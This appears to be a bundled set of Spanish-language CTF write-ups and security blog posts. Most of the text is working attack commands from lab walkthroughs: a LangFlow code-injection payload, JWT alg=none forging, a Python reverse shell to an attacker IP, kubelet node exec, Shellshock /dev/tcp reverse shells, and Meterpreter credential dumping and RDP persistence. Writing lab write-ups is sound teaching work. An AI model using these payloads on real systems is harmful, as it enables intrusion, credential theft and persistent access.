### Envío del payload al endpoint vulnerable\r
\r
\`\`\`bash\r
curl -sk -X POST 'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow' \\\r
  -H 'Content-Type: application/json' \\\r
  -b 'client_id=attacker' \\\r
  -d '{\r
    "data": {\r
      "nodes": [{\r
        "id": "Exploit-001",\r
        "type": "genericNode",\r
        "position": {"x":0,"y":0},\r
        "data": {\r
          "id": "Exploit-001",\r
          "type": "ExploitComp",\r
          "node": {\r
            "template": {\r
              "code": {\r
                "type": "code",\r
                "required": true,\r
                "show": true,\r
                "multiline": true,\r
                "value": "import os\\n\\n_x = os.system(\\"echo \`BASE64-RESULTADO\` | base64 -d | bash\\")\\n\\nfrom langflow.custom import Component\\nfrom langflow.io import Output\\n\\nclass ExploitComp(Component):\\n    display_name=\\"X\\"\\n    outputs=[]\\n    def r(self):\\n        return None",\r
                "name": "code",\r
                "password": false,\r
                "advanced": false,\r
                "dynamic": false\r
              },\r
              "_type": "Component"\r
            },\r
            "description": "X",\r
            "base_classes": ["str"],\r
            "display_name": "ExploitComp",\r
            "name": "ExploitComp",\r
            "frozen": false,\r
            "outputs": [],\r
            "field_order": ["code"],\r
            "beta": false,\r
            "edited": false\r
          }\r
        }\r
      }],\r
      "edges": []\r
    }\r
  }'\r
\`\`\`\r
\r
Este request crea un nodo malicioso en la aplicación y dispara la ejecución de código.\r
\r
---\r
\r
## 5. Acceso inicial\r
\r
Tras la explotación se obtuvo shell reversa en el servidor.\r
\r
Verifiqué el contexto y la aplicación:\r
\r
\`\`\`bash\r
cd /var/www\r
env\r
cat index.html\r
\`\`\`\r
\r
En la salida de \`env\` se encontró la contraseña del usuario:\r
\r
- \`nightfall\`\r
\r
Acceso SSH inicial:\r
\r
\`\`\`bash\r
ssh nightfall@<IP>\r
cat user.txt\r
\`\`\`\r
\r
---\r
\r
## 6. Transición a MCP\r
\r
Se identificó la configuración de MCP localmente:\r
\r
\`\`\`bash\r
cat ~/.mcp/config.json\r
\`\`\`\r
\r
El servidor MCP estaba accesible y permitía autenticación con credenciales conocidas.\r
\r
Autenticación en MCP:\r
\r
\`\`\`bash\r
curl -s -X POST http://10.129.244.214:30080/api/v1/auth \\\r
  -H 'Content-Type: application/json' \\\r
  -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}'\r
\`\`\`\r
\r
Esto devuelve un token JWT válido.\r
\r
---\r
\r
## 7. Creación de JWT administrador con \`alg=none\`\r
\r
Se aprovechó la validación insegura del JWT para crear un token con rol administrador.\r
\r
Script de generación:\r
\r
\`\`\`bash\r
cat > /tmp/craft.py << 'EOF'\r
import base64, json\r
\r
def b64url(data):\r
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()\r
\r
header  = b64url(json.dumps({"alg":"none","typ":"JWT"}).encode())\r
payload = b64url(json.dumps({"sub":"attacker","role":"admin"}).encode())\r
token   = f"{header}.{payload}."\r
\r
print(token)\r
EOF\r
\`\`\`\r
\r
Ejecución:\r
\r
\`\`\`bash\r
python3 /tmp/craft.py\r
\`\`\`\r
\r
Resultado:\r
\r
- Token JWT administrador construido manualmente\r
\r
---\r
\r
## 8. Registro y ejecución de herramienta maliciosa en MCP\r
\r
Se configuró el listener local:\r
\r
\`\`\`bash\r
sudo nc -nvlp 9001\r
\`\`\`\r
\r
Se registró una herramienta maliciosa en MCP usando el token admin:\r
\r
\`\`\`bash\r
ADMIN_JWT="eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiYXR0YWNrZXIiLCAicm9sZSI6ICJhZG1pbiJ9."\r
\r
curl -s -X POST http://10.129.244.214:30080/api/v1/tools \\\r
  -H 'Content-Type: application/json' \\\r
  -H "Authorization: Bearer $ADMIN_JWT" \\\r
  -d '{\r
    "name": "shell",\r
    "description": "debug shell",\r
    "inputSchema": {"type":"object","properties":{}},\r
    "code": "import socket,os,pty\\npid=os.fork()\\nif pid>0:\\n    import sys;sys.exit(0)\\nos.setsid()\\npid=os.fork()\\nif pid>0:\\n    import sys;sys.exit(0)\\ns=socket.socket()\\ns.connect((\\"10.10.14.20\\",9001))\\n[os.dup2(s.fileno(),i) for i in(0,1,2)]\\npty.spawn(\\"/bin/sh\\")"\r
  }'\r
\`\`\`\r
\r
Luego se invocó la herramienta:\r
\r
\`\`\`bash\r
curl -s -X POST http://10.129.244.214:30080/mcp \\\r
  -H 'Content-Type: application/json' \\\r
  -H "Authorization: Bearer $ADMIN_JWT" \\\r
  -d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"shell","arguments":{}}}'\r
\`\`\`\r
\r
Y se estabilizó la shell:\r
\r
\`\`\`bash\r
python3 -c 'import pty; pty.spawn("/bin/bash")'\r
\`\`\`\r
\r
---\r
\r
## 9. Escalada a root en Kubernetes\r
\r
### Confirmar entorno Kubernetes\r
\r
\`\`\`bash\r
cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d. -f2 | base64 -d 2>/dev/null\r
\`\`\`\r
\r
### Revisar permisos con SelfSubjectRulesReview\r
\r
\`\`\`bash\r
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\r
curl -sk -X POST "https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \\\r
  -H "Authorization: Bearer $TOKEN" \\\r
  -H "Content-Type: application/json" \\\r
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}' \\\r
  | python3 -c "\r
import sys,json\r
rules = json.load(sys.stdin)['status'].get('resourceRules',[])\r
for r in rules: print(r)\r
"\r
\`\`\`\r
\r
Resultado relevante:\r
\r
- Permisos de \`nodes/proxy\`\r
\r
Esto permitió continuar la escalada hacia un pod privilegiado.\r
\r
---\r
\r
## 10. Identificación de pod privilegiado\r
\r
Se listaron pods expuestos por el kubelet y se buscó un pod con \`hostPath\` y \`privileged\` habilitado:\r
\r
\`\`\`bash\r
curl -sk "https://10.129.244.214:10250/pods" \\\r
  -H "Authorization: Bearer $TOKEN" \\\r
  | python3 -c "\r
import sys, json\r
data = json.load(sys.stdin)\r
for item in data['items']:\r
    ns   = item['metadata']['namespace']\r
    name = item['metadata']['name']\r
    vols = [v for v in item['spec'].get('volumes', []) if 'hostPath' in v]\r
    for c in item['spec']['containers']:\r
        csc = c.get('securityContext', {})\r
        if csc.get('privileged') and vols:\r
            paths = [v['hostPath']['path'] for v in vols]\r
            print(f'[!] PRIVILEGED: {ns}/{name} - container: {c["name"]} - hostPaths: {paths}')\r
"\r
\`\`\`\r
\r
Se identificó un pod privilegiado con el sistema de archivos del host montado.\r
\r
---\r
\r
## 11. Ejecución remota en el nodo Kubernetes\r
\r
Se creó un script de ejecución remota en el pod:\r
\r
\`\`\`bash\r
cat > /tmp/kube_exec.py << 'EOF'\r
#!/usr/bin/env python3\r
import asyncio, ssl, sys, websockets\r
\r
NODE     = "10.129.244.214"\r
NE_NS    = "monitoring"\r
NE_POD   = "prometheus-prometheus-node-exporter-nmntq"\r
NE_CNT   = "node-exporter"\r
TOKEN    = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()\r
COMMAND  = sys.argv[1] if len(sys.argv) > 1 else 'id'\r
\r
async def ws_exec(cmd_parts):\r
    ctx = ssl.create_default_context()\r
    ctx.check_hostname = False\r
    ctx.verify_mode    = ssl.CERT_NONE\r
\r
    args = "&".join(f"command={part}" for part in cmd_parts)\r
    url  = (f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}"\r
            f"?output=1&error=1&{args}")\r
\r
    async with websockets.connect(\r
        url, ssl=ctx,\r
        additional_headers={"Authorization": f"Bearer {TOKEN}"},\r
        subprotocols=["v4.channel.k8s.io"],\r
        open_timeout=10\r
    ) as ws:\r
        try:\r
            while True:\r
                data = await asyncio.wait_for(ws.recv(), timeout=5)\r
                if isinstance(data, bytes) and len(data) > 1:\r
                    sys.stdout.write(data[1:].decode("utf-8", errors="replace"))\r
                    sys.stdout.flush()\r
        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):\r
            pass\r
\r
asyncio.run(ws_exec(COMMAND.split()))\r
EOF\r
\`\`\`\r
\r
Verificación de dependencias:\r
\r
\`\`\`bash\r
python3 -c "import websockets; print('ok')"\r
\`\`\`\r
\r
Prueba de ejecución:\r
\r
\`\`\`bash\r
python3 /tmp/kube_exec.py "id"\r
\`\`\`\r
\r
Acceso a la bandera root:\r
\r
\`\`\`bash\r
python3 /tmp/kube_exec.py "cat /host/root/root/root.txt"\r
\`\`\`\r
\r
---\r
\r
## 12. Conclusión\r
\r
El compromiso de la máquina **FireFlow** consistió en una cadena de ataque clara y efectiva:\r
\r
- Reconocimiento con \`nmap\`\r
- Descubrimiento de subdominios con \`ffuf\`\r
- Explotación de \`LangFlow v1.8.2\` mediante \`CVE-2026-33017\`\r
- Acceso inicial con shell inversa\r
- Descubrimiento de credenciales de usuario y acceso SSH\r
- Transición a MCP y creación de un JWT administrador vulnerable\r
- Registro y ejecución de una herramienta maliciosa\r
- Escalada a root aprovechando un pod privilegiado en Kubernetes\r
\r
Este caso ilustra cómo las aplicaciones web inseguras y la confiabilidad excesiva en tokens JWT pueden llevar a compromisos de infraestructura completos.\r
`,__vite_glob_0_15=`---\r
title: "hackthebox-shocker"\r
description: "Writeup paso a paso de la máquina Shocker de Hack The Box: reconocimiento, explotación Shellshock y escalada de privilegios hasta root."\r
date: "2026-01-05"\r
published: true\r
tags: ["hackthebox", "writeup", "shellshock", "linux", "web"]\r
readTime: "12 min"\r
---\r
\r
# ✅ Hack The Box — Shocker (Paso a Paso)\r
\r
Guía completa para resolver la máquina Shocker. Trabajaremos desde reconocimiento hasta la obtención de root, explotando la vulnerabilidad Shellshock en un CGI de Apache.\r
\r
---\r
\r
## 1) Preparación del entorno\r
- IP objetivo (HTB): \`10.10.10.X\`\r
- IP atacante: \`10.10.14.Y\`\r
- Herramientas: \`nmap\`, \`gobuster\`, \`curl\`, \`nc\`, \`python\`, \`sudo\`\r
\r
---\r
\r
## 2) Reconocimiento de puertos y servicios\r
\r
\`\`\`bash\r
nmap -sC -sV -oN nmap_initial 10.10.10.X\r
\`\`\`\r
\r
Resultados típicos:\r
- 22/tcp OpenSSH\r
- 80/tcp Apache con soporte CGI\r
\r
Si el escaneo inicial es parco, profundiza:\r
\r
\`\`\`bash\r
nmap -p- --min-rate 5000 -oN nmap_all 10.10.10.X\r
nmap -sC -sV -p 22,80 -oN nmap_detail 10.10.10.X\r
\`\`\`\r
\r
---\r
\r
## 3) Enumeración HTTP\r
\r
\`\`\`bash\r
whatweb http://10.10.10.X/\r
\`\`\`\r
\r
Bruteforce de rutas:\r
\r
\`\`\`bash\r
gobuster dir -u http://10.10.10.X/ -w /usr/share/wordlists/dirb/common.txt -x sh,php,txt,cgi\r
\`\`\`\r
\r
Objetivo: localizar \`/cgi-bin/\` y, dentro, algún script como \`user.sh\`.\r
\r
---\r
\r
## 4) Verificación de Shellshock\r
\r
Shellshock afecta a Bash cuando se evalúan variables de entorno con funciones malformadas. Probamos enviando la carga en el header \`User-Agent\`:\r
\r
\`\`\`bash\r
curl -i -s -H 'User-Agent: () { :; }; echo; echo; /bin/bash -c "id"' \\\r
  http://10.10.10.X/cgi-bin/user.sh\r
\`\`\`\r
\r
Si es vulnerable, verás la salida de \`id\` (por ejemplo \`uid=33(www-data)\`).\r
\r
---\r
\r
## 5) Reverse shell\r
\r
Primero, escucha en tu máquina:\r
\r
\`\`\`bash\r
nc -lvnp 4444\r
\`\`\`\r
\r
Luego, lanza la reverse shell desde el header:\r
\r
\`\`\`bash\r
curl -i -s -H 'User-Agent: () { :; }; echo; echo; /bin/bash -c "bash -c bash -i >& /dev/tcp/10.10.14.Y/4444 0>&1"' \\\r
  http://10.10.10.X/cgi-bin/user.sh\r
\`\`\`\r
\r
Si no funciona, prueba con variantes (URL-encoding o usando \`/bin/sh\`):\r
\r
\`\`\`bash\r
curl -i -s -H 'User-Agent: () { :; }; /bin/bash -c "exec /bin/sh -c \\\\"/bin/sh -i >& /dev/tcp/10.10.14.Y/4444 0>&1\\\\""' \\\r
  http://10.10.10.X/cgi-bin/user.sh\r
\`\`\`\r
\r
---\r
\r
## 6) Estabilizar la shell\r
\r
\`\`\`bash\r
python -c 'import pty; pty.spawn("/bin/bash")'\r
export TERM=xterm\r
stty rows 50 cols 120\r
\`\`\`\r
\r
Explora el sistema:\r
\r
\`\`\`bash\r
whoami\r
uname -a\r
id\r
ls -la /home\r
\`\`\`\r
\r
---\r
\r
## 7) Post-explotación y credenciales\r
\r
Busca credenciales y archivos interesantes:\r
\r
\`\`\`bash\r
find / -type f -name "*.sh" -o -name "*.cgi" 2>/dev/null\r
grep -R "password" /var/www 2>/dev/null\r
cat /etc/passwd\r
\`\`\`\r
\r
Comprueba sudo:\r
\r
\`\`\`bash\r
sudo -l\r
\`\`\`\r
\r
En Shocker, es común que el usuario obtenido tenga permisos \`NOPASSWD\` sobre \`perl\` u otro binario. Si ves algo como:\r
\r
\`\`\`\r
(ALL) NOPASSWD: /usr/bin/perl\r
\`\`\`\r
\r
Puedes escalar a root con:\r
\r
\`\`\`bash\r
sudo perl -e 'exec "/bin/sh";'\r
\`\`\`\r
\r
Si el permiso está restringido a un script concreto, intenta abusar de rutas o argumentos permitidos (GTFOBins es útil).\r
\r
---\r
\r
## 8) Flags\r
\r
\`\`\`bash\r
cat /home/<usuario>/user.txt\r
cat /root/root.txt\r
\`\`\`\r
\r
Guarda los hashes/flags como evidencia.\r
\r
---\r
\r
## 9) Conclusiones y defensa\r
- La exposición de CGI con Bash vulnerable permite RCE vía Shellshock.\r
- Minimiza superficie: deshabilita CGI innecesarios, usa shells actualizadas.\r
- Aplica restricciones de \`sudo\` y revisa binarios con \`NOPASSWD\`.\r
- Monitoriza rutas como \`/cgi-bin/\` y cabeceras anómalas en logs.\r
\r
---\r
\r
## Comandos clave usados\r
\r
\`\`\`bash\r
nmap -sC -sV 10.10.10.X\r
gobuster dir -u http://10.10.10.X/ -w <wordlist> -x sh,cgi\r
curl -H 'User-Agent: () { :; }; ...' http://10.10.10.X/cgi-bin/user.sh\r
nc -lvnp 4444\r
python -c 'import pty; pty.spawn("/bin/bash")'\r
sudo perl -e 'exec "/bin/sh";'\r
\`\`\`\r
¡Felicidades! Hemos completado la máquina.\r
\r
## 📝 Conclusión\r
\r
**Shocker** demuestra de forma clara cómo una mala configuración y software sin parches pueden derivar en un compromiso total del sistema. La exposición de **scripts CGI** ejecutados con una versión vulnerable de **Bash** permitió explotar **Shellshock** y obtener ejecución remota de comandos con extrema facilidad. A partir de ahí, una política de sudo laxa facilitó la escalada de privilegios hasta root en cuestión de minutos.\r
Este laboratorio refuerza la importancia de actualizar componentes críticos, reducir superficie de **ataque (CGI innecesarios)** y auditar permisos privilegiados, ya que una sola debilidad puede ser suficiente para comprometer toda la infraestructura.\r
\r
¡Máquina shocker! 🚩`,__vite_glob_0_16=`---\r
title: "Lame"\r
description: "Writeup de la máquina Lame de HackTheBox. La primera máquina retirada de HTB, ideal para principiantes. Explotación de Samba (CVE-2007-2447) para obtener root directamente."\r
date: "2026-01-01"\r
published: true\r
tags: ["hackthebox", "pentesting", "writeup", "linux", "samba", "cve-2007-2447"]\r
readTime: "10 min"\r
---\r
\r
# 📦 Lame — Writeup HackTheBox\r
\r
## 📖 Introducción\r
\r
**Lame** es, sin duda, la máquina más legendaria de **HackTheBox**. Fue la primera en ser retirada y es, para muchos, el punto de partida en la plataforma. Es una máquina **Linux** de dificultad **Fácil** que demuestra vulnerabilidades críticas en servicios antiguos.\r
\r
En este writeup, explotaremos una vulnerabilidad clásica en **Samba** que nos permitirá obtener acceso como \`root\` sin necesidad de escalar privilegios posteriormente.\r
\r
---\r
\r
## 🔎 Reconocimiento\r
\r
Comenzamos con nuestro escaneo estándar de **Nmap** para identificar puertos y servicios.\r
\r
\`\`\`bash\r
nmap -sVC -T4 -p- 10.10.10.3\r
\`\`\`\r
\r
**Resultados del escaneo:**\r
\r
- **21/tcp (FTP):** vsftpd 2.3.4 (Famoso por tener un backdoor, aunque en esta máquina suele ser un "rabbit hole" o camino falso).\r
- **22/tcp (SSH):** OpenSSH 4.7p1.\r
- **139/445 (SMB):** Samba 3.0.20-Debian.\r
- **3632/tcp (distcc):** distcc v1.\r
\r
El servicio que más llama la atención es **Samba 3.0.20**. Es una versión muy antigua y probablemente vulnerable.\r
\r
---\r
\r
## 🕵️ Enumeración y Análisis de Vulnerabilidades\r
\r
### SMB (Samba 3.0.20)\r
\r
Podemos usar \`searchsploit\` o Google para buscar vulnerabilidades asociadas a esta versión específica de Samba.\r
\r
\`\`\`bash\r
searchsploit Samba 3.0.20\r
\`\`\`\r
\r
El resultado nos apunta a una vulnerabilidad crítica: **"Username map script" Command Execution (CVE-2007-2447)**.\r
\r
> **¿Qué es CVE-2007-2447?**\r
> Esta vulnerabilidad permite a un atacante remoto ejecutar comandos arbitrarios especificando un nombre de usuario que contenga caracteres de shell (\`backticks\` o comillas invertidas) durante la autenticación SMB.\r
\r
---\r
\r
## 🚀 Explotación\r
\r
Vamos a explotar esta vulnerabilidad utilizando **Metasploit Framework** por su simplicidad y eficacia para este caso.\r
\r
### Paso 1: Configuración en Metasploit\r
\r
Iniciamos la consola y buscamos el módulo correspondiente.\r
\r
\`\`\`bash\r
msfconsole\r
search usermap_script\r
use exploit/multi/samba/usermap_script\r
\`\`\`\r
\r
### Paso 2: Configuración de Opciones\r
\r
Configuramos la IP de la máquina víctima (\`RHOSTS\`) y nuestra IP de atacante (\`LHOST\`).\r
\r
\`\`\`bash\r
set RHOSTS 10.10.10.3\r
set LHOST <TU-IP-VPN>\r
\`\`\`\r
\r
Podemos verificar que todo esté correcto con \`show options\`.\r
\r
### Paso 3: Ejecución\r
\r
Lanzamos el exploit.\r
\r
\`\`\`bash\r
exploit\r
\`\`\`\r
\r
Si todo funciona correctamente, Metasploit abrirá una sesión de línea de comandos.\r
\r
\`\`\`bash\r
[*] Started reverse TCP double handler on <TU-IP>:4444 \r
[*] Accepted the first client connection...\r
[*] Command shell session 1 opened...\r
\`\`\`\r
\r
---\r
\r
## 👑 Acceso Root\r
\r
Una vez que tenemos la shell, verificamos qué usuario somos.\r
\r
\`\`\`bash\r
whoami\r
# root\r
\`\`\`\r
\r
¡Sorpresa! Esta vulnerabilidad nos otorga acceso directo como \`root\`, por lo que no es necesaria una fase de escalada de privilegios.\r
\r
Ahora podemos buscar las banderas (flags) de usuario y root.\r
\r
### User Flag\r
\r
\`\`\`bash\r
cd /home/makis\r
cat user.txt\r
\`\`\`\r
\r
### Root Flag\r
\r
\`\`\`bash\r
cd /root\r
cat root.txt\r
\`\`\`\r
\r
---\r
\r
## 📝 Conclusión\r
\r
**Lame** es un excelente ejemplo de por qué es crucial mantener el software actualizado. Un servicio de Samba obsoleto permitió comprometer el sistema completo en cuestión de minutos.\r
\r
**Puntos clave aprendidos:**\r
1. Enumeración precisa de versiones (Samba 3.0.20).\r
2. Uso de bases de datos de exploits (Searchsploit/CVE).\r
3. Explotación de RCE (Remote Code Execution) en servicios de red.\r
\r
¡Máquina pwned! 🚩\r
`,__vite_glob_0_17=`---\r
title: "TryHackMe ICE: explotación y post-explotación"\r
description: "Walkthrough de la máquina ICE de TryHackMe con Nmap, Metasploit y post-explotación en Windows."\r
date: "2026-05-27"\r
published: true\r
tags:\r
  - tryhackme\r
  - pentesting\r
  - metasploit\r
  - post-explotación\r
  - windows\r
readTime: "7 min"\r
---\r
\r
# TryHackMe ICE: explotación y post-explotación\r
\r
En este post cuento un flujo rápido para comprometer la máquina \`ICE\` de TryHackMe. El objetivo fue ir desde el reconocimiento inicial hasta obtener privilegios de SYSTEM y ejecutar módulos de post-explotación.\r
\r
## 1. Preparación\r
\r
Primero aseguré la resolución del nombre en mi entorno local, editando \`/etc/hosts\` para que el nombre de la máquina apunte a la IP objetivo.\r
\r
\`\`\`bash\r
nano /etc/hosts\r
\r
# Añadir algo como:\r
# 10.10.10.123 ice.tryhackme\r
\`\`\`\r
\r
Esto facilita ejecutar algunos escaneos o conexiones si el reto requiere nombre de host.\r
\r
## 2. Reconocimiento con Nmap\r
\r
Usé Nmap con scripts, detección de versiones y una tasa de envío alta para obtener resultados rápidos.\r
\r
\`\`\`bash\r
nmap -sCV -T5 --min-rate 95000 <IP>\r
\`\`\`\r
\r
El hallazgo principal fue un servicio HTTP vulnerable con un encabezado \`IceCast\` o \`icecast_header\`.\r
\r
## 3. Explotación con Metasploit\r
\r
Arranqué Metasploit y cargué el exploit identificado.\r
\r
\`\`\`bash\r
msfconsole\r
\r
use exploit/windows/http/icecast_header\r
set RHOSTS <IP>\r
set LHOST <mi_ip>\r
run\r
\`\`\`\r
\r
Una vez explotado, confirmé el acceso con los comandos básicos de Meterpreter.\r
\r
\`\`\`bash\r
getuid\r
sysinfo\r
\`\`\`\r
\r
## 4. Enumeración local\r
\r
Para identificar vectores de escalada de privilegios, ejecuté el sugeridor automático de exploits locales.\r
\r
\`\`\`bash\r
run post/multi/recon/local_exploit_suggester\r
\`\`\`\r
\r
El reporte devolvió un exploit válido para bypass UAC usando \`eventvwr\`.\r
\r
## 5. Manejo de la sesión\r
\r
Puse la sesión en segundo plano para cambiar a la explotación local.\r
\r
\`\`\`bash\r
background\r
\`\`\`\r
\r
Luego cargué el módulo local y revisé sus opciones.\r
\r
\`\`\`bash\r
use exploit/windows/local/bypassuac_eventvwr\r
options\r
set LHOST <mi_ip>\r
run\r
\`\`\`\r
\r
## 6. Obtener privilegios más altos\r
\r
Con la explotación local, verifiqué privilegios y procesos.\r
\r
\`\`\`bash\r
getprivs\r
ps\r
\`\`\`\r
\r
A continuación migré a un proceso estable para mantener sesión.\r
\r
\`\`\`bash\r
migrate <PID>\r
getuid\r
\`\`\`\r
\r
## 7. Cargar \`kiwi\` y extraer credenciales\r
\r
Ya con una sesión estable, cargué el módulo \`kiwi\` para acceder a hashes y credenciales.\r
\r
\`\`\`bash\r
load kiwi\r
help\r
creds_all\r
\`\`\`\r
\r
También revisé algunos comandos útiles de Meterpreter.\r
\r
\`\`\`bash\r
help\r
hashdump\r
\`\`\`\r
\r
## 8. Opciones adicionales de post-explotación\r
\r
Exploré capacidades adicionales que se pueden usar en un entorno comprometido.\r
\r
\`\`\`bash\r
screenshare\r
record_mic\r
\`\`\`\r
\r
La máquina ICE es ideal para practicar técnicas de persistencia y movimiento lateral, aunque en este walkthrough el foco fue la escalada local y la extracción de credenciales.\r
\r
## 9. Crear ticket dorado (teórico)\r
\r
Una de las capacidades avanzadas en un host Windows es la posibilidad de crear un Golden Ticket si tenemos acceso a credenciales Kerberos o \`krbtgt\`.\r
\r
\`\`\`bash\r
golden_ticket_create\r
\`\`\`\r
\r
Este paso no siempre es posible en todos los escenarios, pero es un buen recordatorio de lo que se puede hacer desde un host de dominio comprometido.\r
\r
## 10. Habilitar RDP\r
\r
Una vez dentro, habilité el acceso remoto para mantener un acceso persistente o facilitar un segundo punto de entrada.\r
\r
\`\`\`bash\r
run post/windows/manage/enable_rdp\r
\`\`\`\r
\r
## Conclusión\r
\r
ICE es una máquina que permite practicar varios pasos del flujo de ataque: reconocimiento rápido, explotación HTTP con Metasploit, bypass de UAC local y post-explotación con Meterpreter. El uso de \`local_exploit_suggester\` y \`kiwi\` demuestran cómo pasar de una shell inicial a un control más profundo del sistema Windows.\r
\r
> Nota: siempre realiza este tipo de pruebas en entornos autorizados y con objetivos de laboratorio como TryHackMe.\r
`,__vite_glob_0_18=`---\r
title: "Ingeniería Social: El Arte de la Persuasión en Ciberseguridad"\r
description: "La ingeniería social es una técnica utilizada por atacantes para manipular personas y obtener información confidencial. Aprende cómo identificar, prevenir y protegerte de estos ataques."\r
date: "2025-11-04"\r
published: true\r
tags: ["ingeniería social", "ciberseguridad", "phishing", "seguridad"]\r
readTime: "7 min"\r
---\r
\r
## Introducción\r
\r
La **ingeniería social** es una de las técnicas más poderosas y peligrosas en ciberseguridad.  \r
A diferencia de los ataques técnicos, **explota la psicología humana**, aprovechándose de la confianza, el miedo o la curiosidad de las personas para obtener información sensible, credenciales o acceso a sistemas.\r
\r
Este artículo explora los tipos de ataques más comunes, técnicas de prevención y cómo capacitar a usuarios para minimizar riesgos.\r
\r
---\r
\r
## Tipos Comunes de Ingeniería Social\r
\r
### 1. Phishing\r
- Mensajes fraudulentos enviados por correo electrónico o mensajería, diseñados para engañar al receptor y robar credenciales.  \r
- Ejemplo: Correos que aparentan ser de bancos solicitando verificación de cuenta.\r
\r
### 2. Spear Phishing\r
- Variante de phishing altamente dirigida, investigando información personal de la víctima para aumentar la efectividad del ataque.  \r
\r
### 3. Vishing (Voice Phishing)\r
- Ataques a través de llamadas telefónicas que buscan obtener información confidencial.  \r
\r
### 4. Smishing (SMS Phishing)\r
- Uso de mensajes de texto para engañar a las víctimas, incluyendo enlaces maliciosos o solicitudes de información sensible.  \r
\r
### 5. Pretexting\r
- Creación de una historia o rol falso para ganar confianza y obtener datos que normalmente no se compartirían.\r
\r
---\r
\r
## Técnicas de Ingeniería Social Más Efectivas\r
\r
1. **Urgencia o miedo**  \r
   - Presionar al objetivo con mensajes que aparentan urgencia, como supuestas amenazas de seguridad.  \r
\r
2. **Confianza**  \r
   - Suplantar autoridades o compañeros de trabajo para que la víctima entregue información sin cuestionarla.  \r
\r
3. **Curiosidad o recompensa**  \r
   - Ofrecer premios, enlaces interesantes o acceso exclusivo que incite al usuario a interactuar.  \r
\r
4. **Interacción en redes sociales**  \r
   - Extraer información personal de perfiles públicos para diseñar ataques dirigidos.\r
\r
---\r
\r
## Cómo Protegerse\r
\r
- **Educación continua**: Capacitar a empleados sobre phishing, vishing y smishing.  \r
- **Verificación de identidad**: Confirmar siempre la autenticidad de solicitudes de información.  \r
- **Políticas de seguridad claras**: Establecer procedimientos para compartir datos sensibles.  \r
- **Simulaciones de ataque**: Practicar ataques controlados para aumentar la conciencia de los usuarios.  \r
- **Uso de autenticación multifactor (MFA)**: Agregar capas adicionales de protección a cuentas críticas.\r
\r
---\r
\r
## Casos Reales de Ingeniería Social\r
\r
- **Ataque a una compañía energética**: Un atacante se hizo pasar por técnico de mantenimiento y obtuvo acceso físico a servidores.  \r
- **Filtración de correos corporativos**: Campañas de spear phishing dirigidas a ejecutivos resultaron en robo de información financiera.  \r
- **Estafas vía SMS**: Usuarios recibieron enlaces falsos que descargaban malware en sus dispositivos móviles.\r
\r
---\r
\r
## Conclusión\r
\r
La **ingeniería social** demuestra que la ciberseguridad no depende únicamente de la tecnología.  \r
La **conciencia y educación de los usuarios** son tan importantes como firewalls, antivirus y cifrado. Comprender cómo los atacantes manipulan comportamientos humanos es la clave para reducir riesgos y proteger tanto información personal como corporativa.\r
\r
> En ciberseguridad, la persona más vulnerable no siempre es el sistema, sino el usuario.\r
`,__vite_glob_0_19=`---\r
title: "Introducción al Hacking Ético"\r
description: "El hacking ético es una disciplina esencial en la ciberseguridad moderna. Los hackers éticos, también llamados pentesters, utilizan sus conocimientos para detectar vulnerabilidades antes de que puedan ser aprovechadas por atacantes maliciosos."\r
date: "2025-11-01"\r
published: true\r
tags: ["hacking", "seguridad", "principiantes"]\r
readTime: "6 min"\r
---\r
\r
## ¿Qué es el Hacking Ético?\r
\r
El **hacking ético**, también conocido como **penetration testing** o **pentesting**, consiste en simular ataques controlados contra sistemas, redes o aplicaciones con el objetivo de **identificar y corregir vulnerabilidades de seguridad**.  \r
A diferencia del hacking malicioso, su propósito no es dañar, sino **proteger y fortalecer la infraestructura tecnológica** de una organización.\r
\r
Los profesionales que lo practican —conocidos como **ethical hackers o white hats**— cuentan con autorización previa para realizar pruebas, siguiendo principios éticos y legales.\r
\r
---\r
\r
## Principios Fundamentales\r
\r
1. 🛑 **Autorización**: Nunca se realiza una prueba sin el consentimiento explícito del propietario del sistema.  \r
2. ⚖️ **Legalidad**: Toda actividad debe cumplir las leyes y regulaciones aplicables.  \r
3. 🧩 **Responsabilidad**: Las vulnerabilidades descubiertas deben reportarse de forma responsable para evitar su uso indebido.  \r
4. 🔒 **Confidencialidad**: La información sensible obtenida durante las pruebas debe protegerse con el máximo cuidado.\r
\r
---\r
\r
## Herramientas Esenciales\r
\r
Estas son algunas de las herramientas más comunes utilizadas por pentesters y analistas de seguridad:\r
\r
- **Nmap** 🧭 — Escáner de red para detectar hosts activos, puertos abiertos y servicios.  \r
- **Wireshark** 🌐 — Analizador de tráfico que permite inspeccionar protocolos y detectar anomalías en red.  \r
- **Metasploit Framework** 💣 — Plataforma de explotación que facilita pruebas de vulnerabilidades conocidas.  \r
- **Burp Suite** 🕷️ — Proxy avanzado para auditar y manipular solicitudes en aplicaciones web.\r
\r
---\r
\r
## Metodologías Reconocidas\r
\r
### 🧱 OWASP Testing Guide\r
Guía enfocada en la **seguridad de aplicaciones web**, estableciendo buenas prácticas para identificar fallos como inyecciones, XSS o configuraciones inseguras.\r
\r
### 🧭 PTES (Penetration Testing Execution Standard)\r
Estándar que define las fases del pentesting, desde la **planificación, reconocimiento y explotación**, hasta la **redacción del reporte final**, garantizando una ejecución estructurada y profesional.\r
\r
---\r
\r
## Importancia del Hacking Ético\r
\r
El hacking ético permite a las organizaciones **anticiparse a los atacantes**, detectar debilidades antes de que sean explotadas y mejorar sus defensas de manera continua.  \r
Además, es una puerta de entrada a una carrera apasionante dentro de la ciberseguridad, que combina **curiosidad, análisis técnico y responsabilidad profesional**.\r
\r
---\r
\r
## Conclusión\r
\r
El **hacking ético** no solo consiste en encontrar vulnerabilidades, sino en comprender cómo proteger la información y reducir riesgos reales.  \r
